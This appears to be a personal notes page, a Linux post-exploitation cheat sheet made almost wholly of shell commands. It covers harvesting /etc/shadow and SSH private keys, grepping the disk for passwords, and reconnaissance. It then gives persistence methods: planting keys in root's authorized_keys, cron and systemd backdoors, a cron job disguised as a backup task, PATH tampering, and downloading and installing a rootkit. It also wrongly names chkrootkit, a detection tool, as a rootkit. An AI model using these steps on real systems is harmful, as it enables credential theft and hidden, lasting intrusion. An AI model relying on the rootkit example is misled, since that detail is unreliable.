---
layout: notes
permalink: /notes/linux/post/
title: Linux Post Exploitation
---

# Linux Post Exploitation

## Data Collection

### Sensitive Files
```bash
# Common locations
/etc/shadow
/etc/passwd
/etc/ssh/ssh_host_*
/home/*/.ssh/id_*
/root/.ssh/id_*

# Find additional sensitive files
find / -name "*.pem" 2>/dev/null
grep -r "password" / 2>/dev/null
cat /var/www/html/config.php
cat /etc/nginx/nginx.conf
cat /etc/apache2/sites-enabled/*
```

### Network Information
```bash
# Gather network data
ip neighbor
route -n
cat /etc/hosts
cat /etc/resolv.conf

# External network mapping
nmap -sn <network>

# Check DNS for pivoting
dig <domain>
```

### Process Information
```bash
ps auxf
pstree -a
lsof -i

# Check scheduled tasks
crontab -l
cat /etc/cron.*
cat /etc/cron.d/*

# Real-time process monitoring
pspy64: `./pspy64`
```

## Persistence Techniques

```bash
# Generate SSH key
ssh-keygen -t rsa -b 4096

# Copy public key
echo "your_public_key" >> /root/.ssh/authorized_keys
echo "your_public_key" >> /home/user/.ssh/authorized_keys

# Modify SSH config
echo "AllowUsers yourusername" >> /etc/ssh/sshd_config
ssh-copy-id user@target
```

### Cron Jobs
```bash
# Add persistent cron job
echo "* * * * * /path/to/backdoor" >> /var/spool/cron/crontabs/root

# Mask cron job as legit task
echo "0 0 * * * /usr/bin/backup.sh" >> /etc/cron.daily/backup

# Verify cron jobs
crontab -u root -l
```

### Service Creation
```bash
# Create systemd service
cat > /etc/systemd/system/backdoor.service << EOF
[Unit]
Description=Backdoor Service

[Service]
ExecStart=/path/to/backdoor

[Install]
WantedBy=multi-user.target
EOF

# Enable and start service
systemctl enable backdoor.service
systemctl start backdoor.service

# Check service status
systemctl status backdoor.service
```

### Rootkit Installation
```bash
# Install simple rootkit (example: chkrootkit or knark)
wget <rootkit_url> -O rootkit.tar.gz
tar -xzf rootkit.tar.gz
cd rootkit
make install
```

### Environmental Variables
```bash
# Add persistent environment variable
echo "export PATH=$PATH:/path/to/backdoor" >> /root/.bashrc
```